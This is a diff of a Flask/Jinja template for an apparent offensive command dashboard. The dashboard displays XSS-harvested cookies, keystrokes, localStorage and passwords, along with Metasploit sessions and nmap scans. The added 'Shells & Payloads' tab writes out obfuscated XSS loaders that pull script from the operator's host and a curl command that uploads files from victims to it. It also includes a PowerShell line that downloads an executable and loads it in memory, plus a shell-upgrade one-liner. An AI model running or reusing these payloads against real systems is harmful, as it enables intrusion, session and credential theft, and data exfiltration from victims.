@@ -1,6 +1,14 @@
 {% extends "bootstrap/base.html" %}
 {% block title %}Incompetent Bastard{% endblock %}
 
+
+   {% block styles %}
+{{super()}}
+
+    <link href="{{url_for('static', filename='incompetentbastard.css')}}" rel="stylesheet">
+
+{% endblock %}
+
 {% block scripts %}
 
 {{super()}}
@@ -10,14 +18,14 @@
 
 
 {% block navbar %}
-<span class="button">Database</span>
+uitloggen
 {% endblock %}
 
 {% block content %}
 <div class="container">
 <div class="well">
   <h1>Incompetent Bastard</h1>
-  <p>{{quotes}}</p>
+  <p id="updates">{{quotes}}</p>
 </div>
 
 
@@ -35,7 +43,26 @@
       <li><a href="#tab2" data-toggle="tab">Notes</a>
       </li>
 
+  <li class="dropdown">
+    <a class="dropdown-toggle" data-toggle="dropdown" href="#"> Agents <span class="badge">42</span>
+    <span class="caret"></span></a>
+    <ul class="dropdown-menu">
+ <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Connected Agents</a></li>
+  <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Interact</a></li>
 
+  <li class="divider"></li>
+         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Command flow</a></li>
+
+    </ul>
+  </li>
+
+  <li class="dropdown">
+    <a class="dropdown-toggle" data-toggle="dropdown" href="#">WEB
+    <span class="caret"></span></a>
+    <ul class="dropdown-menu">
+ {% if cookies or keylogger or localstorage or wachtwoorden: %}
+       <li role="presentation" class="dropdown-header">XXS results</li>
+       {% endif %}
   {% if cookies: %}
       <li><a href="#tab3" data-toggle="tab">Cookies</a>
       </li>{% endif%}{% if  keylogger: %}
@@ -43,17 +70,32 @@
       </li>{% endif %}
       {% if localstorage: %}
       <li><a href="#tab5" data-toggle="tab">LocalStorage</a>
-      </li>{% endif%}{% if  keylogger: %}
+      </li>{% endif%}{% if   wachtwoorden: %}
       <li><a href="#tab6" data-toggle="tab">Password</a>
       </li>{% endif %}
-
+           <li class="divider"></li>
+         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Custom XSS</a></li>
+         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Custom XXE</a></li>
+         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Custom CSRF</a></li>
+         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Custom SSRF</a></li>
+    </ul>
+  </li>
+  <li class="dropdown">
+    <a class="dropdown-toggle" data-toggle="dropdown" href="#">Docs
+    <span class="caret"></span></a>
+    <ul class="dropdown-menu">
       <li><a href="#tab8" data-toggle="tab">Shells & Payloads</a>
       <li><a href="#tab9" data-toggle="tab">Commands</a></li>
-
+        <li><a href="#tab9" data-toggle="tab">Basic manual</a></li>
+        <li><a href="#tab9" data-toggle="tab">Flask admin</a></li>
+    </ul>
+  </li>
   <li class="dropdown">
     <a class="dropdown-toggle" data-toggle="dropdown" href="#">Bookmarks
     <span class="caret"></span></a>
     <ul class="dropdown-menu">
+
+      <li class="divider"></li>
       <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">bitvijays.github.io (Vulnerable Machines)</a></li>
       <li><a href="https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html" target="_blank">bitvijays.github.io (Vulnerability Analysis)</a></li>
 
@@ -70,6 +112,9 @@
 
       <li><a href="https://github.com/esidate/pentesting-active-directory/blob/main/v1/pentesting_active_directory_dark.png" target="_blank">Orange Cyberdefense V1 Active directory</a></li>
          <li><a href="https://github.com/esidate/pentesting-active-directory/blob/main/v2/pentesting_active_directory.svg" target="_blank">Orange Cyberdefense V2 Active directory</a></li> 
+
+           <li class="divider"></li>
+         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Add Bookmark</a></li>
     </ul>
   </li>
 
@@ -81,23 +126,32 @@
 <h1>Dashboard</h1>
 <div id="poller">
 We have {{aantalhooked}} hits on xxs.js
+
+
 <h4>Available screens</h4>
-<pre>screens
+<pre>{{screens}}
 </pre>
 <h4>Available MSF sessions</h4>
 <pre>
 sessions
 </pre>
 
-<h4>Nmap -F</h4>
-<pre>
-sessions
-</pre>
+<h4>Nmap -Pn -sT -sV -d -A -F --open</h4>
+{% for x in nmap %}
+
+<pre>{{x | inhoudweergeven}}</pre>
+
+{% endfor %}
 </div>		
 </div>
 {% if template: %}
 <div class="tab-pane fade {{'tab1' | zet_actief(cms_pag)}}" id="tab1">
+<a class="btn btn-success pull-right" href="/dashboard/findings/rapport" target="_blank">Generate rapport</a>
 <h1>Findings</h1>
+
+<p>Hier komt behulpzame tekst</p>
+
+<hr />
 {% for x in template: %}
 <h4 title="{{x.enbeschrijving}}">{{x.titel}}</h4>
 <ul>
@@ -155,14 +209,27 @@ sessions
 <div class="tab-pane fade" id="tab8">
 <h1>Shells & Payloads</h1>
 <h4>XXS Payloads</h4>
-<p>Jquery jQuery.getScript('{{appdata.localhost}}');</p>
+<p>Jquery jQuery.getScript('{{appdata.localhost}}/x.js');</p>
 <pre>'+eval(atob('{{js1}}'))+'</pre>
-<p>Stand alone</p>
+<p>Stand alone: &lt;script src="{{appdata.localhost}}/x.js"&gt;&lt/script&gt;</p>
 <pre>'+btoa(eval(atob('{{js2}}')))+'</pre>
-<p>ewewwewe</p>
-<h4>Upgrading shell...</h4>
+
+
+<h4>Handy stuff</h4>
+<p>Extracting files from hosts (use curl.exe for powershell)</p>
+<pre>curl -F file=@FILENAME {{appdata.localhost}}/upload</pre>
+<p>Upgrading shell...</p>
 <pre>python -c'import pty; pty.spawn("/bin/bash")'</pre>
-<h4>More stuff...</h4>
+<p>Upgrading shell...</p>
+<pre></pre>
+
+<p>Basic injection</p>
+<pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
+<p>Basic injection II</p>
+<pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
+
+
+<h4>More stuff generated with ./reverseshells.sh</h4>
 <pre>
 {{shells}}
 </pre>
@@ -170,7 +237,9 @@ sessions
 <div class="tab-pane fade" id="tab9">
 <h1>Commands</h1>
 <p>Some basic commands</p>
-
+{% for x in commands: %}
+  {{x | inhoudweergeven(1) | safe}}
+{% endfor %}
 </div>
 </div>
 </div>
@@ -191,11 +260,233 @@ sessions
       <div class="modal-body mijn-tekst">
 
       </div>
+
+
+
+
+
+      <div class="cvss-calculator">
+                            <form name="cvss-form">
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <div class="cvss-formula">
+                                            <div class="cvss-formula-title"><span>CVSSv3 Score</span></div>
+                                            <div class="cvss-formuls-body">
+                                                <textarea class="cvss-formla-value" name="cvss-formula-value" id="vectorString"></textarea>
+                                                <input type="button" value="Bereken" class="cvss-formula-reset" id="vectorStringReset" >
+                                                 <input type="button" value="Bereken" class="cvss-formula-reset" id="vectorStringReset" >
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                        <div class="cvss-section">
+                                            <div class="cvss-section-header">
+                                                <span class="cvss-section-title" id="baseMetricGroup_Legend">Base score</span>
+                                                <span id="cvss-base-score" class="cvss-score cvss-score-medium scoreRating"><b id="baseMetricScore"></b> <span id="baseSeverity"></span></span>
+                                            </div>
+                                            <div class="cvss-section-metrics">
+
+                                                <div class="panel panel-cvss">
+                                                    <div class="panel-heading">
+                                                        <b id="AV_Heading">Attac Vector (AV)</b>
+                                                    </div>
+                                                    <div class="panel-body">
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-n" type="radio" name="AV" id="AV_N" value="N">
+                                                            <label class="cvss-radio-label" id="AV_N_Label" for="AV_N">Network</label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-a" type="radio" name="AV" id="AV_A" value="A">
+                                                            <label class="cvss-radio-label" id="AV_A_Label" for="AV_A">Adjacent</label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-l" type="radio" name="AV" id="AV_L" value="L">
+                                                            <label class="cvss-radio-label" id="AV_L_Label" for="AV_L">Local</label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-p" type="radio" name="AV" id="AV_P" value="P">
+                                                            <label class="cvss-radio-label" id="AV_P_Label" for="AV_P">Physic</label>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="panel panel-cvss">
+                                                    <div class="panel-heading">
+                                                        <b id="AC_Heading">Attack Complexity (AC)</b>
+                                                    </div>
+                                                    <div class="panel-body">
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-l" type="radio" name="AC" id="AC_L" value="L">
+                                                            <label class="cvss-radio-label" id="AC_L_Label" for="AC_L">Low</label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-h" type="radio" name="AC" id="AC_H" value="H">
+                                                            <label class="cvss-radio-label" id="AC_H_Label" for="AC_H">High</label>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="panel panel-cvss">
+                                                    <div class="panel-heading">
+                                                        <b id="PR_Heading">Privileges Required (PR)</b>
+                                                    </div>
+                                                    <div class="panel-body">
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-n" type="radio" name="PR" id="PR_N" value="N">
+                                                            <label class="cvss-radio-label" id="PR_N_Label" for="PR_N">None</label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-l" type="radio" name="PR" id="PR_L" value="L">
+                                                            <label class="cvss-radio-label" id="PR_L_Label" for="PR_L">Low</label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-h" type="radio" name="PR" id="PR_H" value="H">
+                                                            <label class="cvss-radio-label" id="PR_H_Label" for="PR_H">High</label>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="panel panel-cvss">
+                                                    <div class="panel-heading">
+                                                        <b id="UI_Heading">User Interaction (UI)</b>
+                                                    </div>
+                                                    <div class="panel-body">
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-n" type="radio" name="UI" id="UI_N" value="N">
+                                                            <label class="cvss-radio-label" id="UI_N_Label" for="UI_N">None</label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-r" type="radio" name="UI" id="UI_R" value="R">
+                                                            <label class="cvss-radio-label" id="UI_R_Label" for="UI_R">Reuired</label>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="panel panel-cvss">
+                                                    <div class="panel-heading">
+                                                        <b id="S_Heading">Scope (S)</b>
+                                                    </div>
+                                                    <div class="panel-body">
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-u" type="radio" name="S" id="S_U" value="U">
+                                                            <label class="cvss-radio-label" id="S_U_Label" for="S_U">
+                                                                Unchanged
+                                                            </label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-c" type="radio" name="S" id="S_C" value="C">
+                                                            <label class="cvss-radio-label" id="S_C_Label" for="S_C">
+                                                                Changed
+                                                            </label>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <hr />
+                                                <div class="panel panel-cvss">
+                                                    <div class="panel-heading">
+                                                        <b id="C_Heading">Confidentality (C)</b>
+                                                    </div>
+                                                    <div class="panel-body">
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-n" type="radio" name="C" id="C_N" value="N">
+                                                            <label class="cvss-radio-label" id="C_N_Label" for="C_N">
+                                                                None
+                                                            </label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-l" type="radio" name="C" id="C_L" value="L">
+                                                            <label class="cvss-radio-label" id="C_L_Label" for="C_L">
+                                                                Low
+                                                            </label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-h" type="radio" name="C" id="C_H" value="H">
+                                                            <label class="cvss-radio-label" id="C_H_Label" for="C_H">
+                                                                High
+                                                            </label>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="panel panel-cvss">
+                                                    <div class="panel-heading">
+                                                        <b id="I_Heading">Integrity (I)</b>
+                                                    </div>
+                                                    <div class="panel-body">
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-n" type="radio" name="I" id="I_N" value="N">
+                                                            <label class="cvss-radio-label" id="I_N_Label" for="I_N">
+                                                                None
+                                                            </label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-l" type="radio" name="I" id="I_L" value="L">
+                                                            <label class="cvss-radio-label" id="I_L_Label" for="I_L">
+                                                                Low
+                                                            </label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-h" type="radio" name="I" id="I_H" value="H">
+                                                            <label class="cvss-radio-label" id="I_H_Label" for="I_H">
+                                                                High
+                                                            </label>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="panel panel-cvss">
+                                                    <div class="panel-heading">
+                                                        <b id="A_Heading">Availability (A)</b>
+                                                    </div>
+                                                    <div class="panel-body">
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-n" type="radio" name="A" id="A_N" value="N">
+                                                            <label class="cvss-radio-label" id="A_N_Label" for="A_N">
+                                                                None
+                                                            </label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-l" type="radio" name="A" id="A_L" value="L">
+                                                            <label class="cvss-radio-label" id="A_L_Label" for="A_L">
+                                                                Low
+                                                            </label>
+                                                        </div>
+                                                        <div class="cvss-radio">
+                                                            <input class="cvss-radio-input val-h" type="radio" name="A" id="A_H" value="H">
+                                                            <label class="cvss-radio-label" id="A_H_Label" for="A_H">
+                                                                High
+                                                            </label>
+                                                        </div>
+                                                    </div>
+                          </div>
+                  </div>
+
+
         <div class="modal-footer">
          <button type="button" class="btn btn-danger" data-dismiss="modal">Sluiten</button>
       </div>
     </div>
   </div>
 </div>
+
+
+
+
+
+
+
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+
 
 {% endblock %}
